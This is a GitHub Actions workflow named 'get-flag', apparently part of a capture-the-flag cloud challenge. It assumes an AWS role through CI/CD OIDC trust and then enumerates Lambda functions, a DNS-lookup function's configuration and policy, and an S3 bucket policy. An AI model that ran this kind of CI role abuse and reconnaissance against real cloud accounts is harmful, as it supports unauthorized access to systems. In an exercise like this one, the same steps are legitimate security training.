name: get-flag

on:
  push:
    branches: [corgi]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Recon
        run: |
          echo "=== Lambda Functions ==="
          aws lambda list-functions --query 'Functions[].{Name:FunctionName,Runtime:Runtime,Role:Role,Vpc:VpcConfig.VpcId}' --output table || true

          echo ""
          echo "=== Trying to find the nslookup function ==="
          FUNC=$(aws lambda list-functions --query 'Functions[?contains(FunctionName, `nslookup`) || contains(FunctionName, `lookup`) || contains(FunctionName, `dns`)].FunctionName' --output text)
          echo "Found: $FUNC"

          if [ -n "$FUNC" ]; then
            echo ""
            echo "=== Function Configuration ==="
            aws lambda get-function-configuration --function-name "$FUNC" || true

            echo ""
            echo "=== Function Policy ==="
            aws lambda get-policy --function-name "$FUNC" || true
          fi

          echo ""
          echo "=== S3 Bucket Policy (codec4f26c862a321ef5) ==="
          aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 || true
